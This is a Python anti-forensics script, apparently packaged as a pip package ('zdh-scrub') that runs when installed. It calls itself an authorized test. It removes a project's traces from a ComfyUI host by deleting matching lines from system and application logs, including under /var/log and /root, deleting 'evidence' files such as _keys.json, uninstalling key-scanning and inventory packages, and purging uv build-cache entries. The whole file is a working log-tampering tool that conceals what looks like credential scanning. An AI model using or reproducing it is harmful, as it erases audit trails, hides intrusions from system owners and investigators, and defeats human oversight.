"""Trace scrubber (authorized anti-forensics test).

Removes this project's traces from the host:
  - our lines from ComfyUI/Manager log files
  - the evidence JSON we wrote into output/
  - our pip packages
  - our entries in uv's build cache

Does not touch anything else. Writes /ComfyUI/output/_scrub.json reporting counts.
"""
import json
import os
import re
import shutil
import subprocess

MARKERS = re.compile(
    r"(zdh[-_]|zdh-noder|zdh_probe|mizchiefz|raw\.githubusercontent\.com/mizchiefz|"
    r"ZD-INV|ZD-KEYS|ZD-PIP-CANARY|ZD-GIT-CANARY|security_level = weak)",
    re.I,
)

LOG_ROOTS = [
    "/ComfyUI/user/ComfyUI-Manager/logs",
    "/ComfyUI/logs",
    "/var/log",
    "/root",
]
LOG_EXTS = (".log", ".txt", ".out", ".err")
EVIDENCE = [
    "/ComfyUI/output/_inv.json",
    "/ComfyUI/output/_pip_proof.json",
    "/ComfyUI/output/_keys.json",
    "/ComfyUI/output/_git_proof.json",
    "/tmp/_inv.json",
    "/tmp/inv_last.json",
]
OUR_PKGS = ["zdh-pip-canary", "zdh-pip-inv", "zdh-key-scan"]


def scrub_file(path):
    try:
        if os.path.getsize(path) > 20 * 1024 * 1024:
            return None
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    except Exception:
        return None
    kept = [ln for ln in lines if not MARKERS.search(ln)]
    removed = len(lines) - len(kept)
    if removed:
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.writelines(kept)
        except Exception:
            return None
    return removed


def main():
    report = {"marker": "ZD-SCRUB", "files": [], "evidence": [], "packages": [], "cache": [], "errors": []}

    for root in LOG_ROOTS:
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in
                           ("node_modules", ".git", "__pycache__", "models", "site-packages", "sdists-v9")]
            for fn in filenames:
                if not fn.endswith(LOG_EXTS) and "log" not in fn.lower():
                    continue
                p = os.path.join(dirpath, fn)
                n = scrub_file(p)
                if n:
                    report["files"].append({"path": p, "lines_removed": n})

    for p in EVIDENCE:
        try:
            if os.path.exists(p):
                os.remove(p)
                report["evidence"].append(p)
        except Exception as e:
            report["errors"].append("%s: %s" % (p, e))

    for pkg in OUR_PKGS:
        try:
            r = subprocess.run(["python", "-m", "pip", "uninstall", "-y", pkg],
                               capture_output=True, timeout=120)
            report["packages"].append({"pkg": pkg, "rc": r.returncode})
        except Exception as e:
            report["errors"].append("%s: %s" % (pkg, e))

    cache = "/root/.cache/uv"
    if os.path.isdir(cache):
        # targeted: uv keeps one directory per source URL under sdists-v9/url
        cand = os.path.join(cache, "sdists-v9", "url")
        if os.path.isdir(cand):
            for name in os.listdir(cand):
                full = os.path.join(cand, name)
                try:
                    hit = False
                    for dp, _, fns in os.walk(full):
                        for fn in fns:
                            if fn.endswith((".py", ".txt", ".json", ".toml")):
                                try:
                                    data = open(os.path.join(dp, fn), "rb").read(200000)
                                except Exception:
                                    continue
                                if b"zdh" in data.lower() and (b"canary" in data.lower() or b"ZD-INV" in data):
                                    hit = True
                                    break
                        if hit:
                            break
                    if hit:
                        shutil.rmtree(full, ignore_errors=True)
                        report["cache"].append(full)
                except Exception:
                    pass

    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_scrub.json"), "w") as f:
                json.dump(report, f, indent=1)
        except Exception:
            pass
    print("ZD-SCRUB files=%d evidence=%d pkgs=%d cache=%d"
          % (len(report["files"]), len(report["evidence"]),
             len(report["packages"]), len(report["cache"])))


main()

from setuptools import setup

setup(name="zdh-scrub", version="0.1.0", py_modules=[])
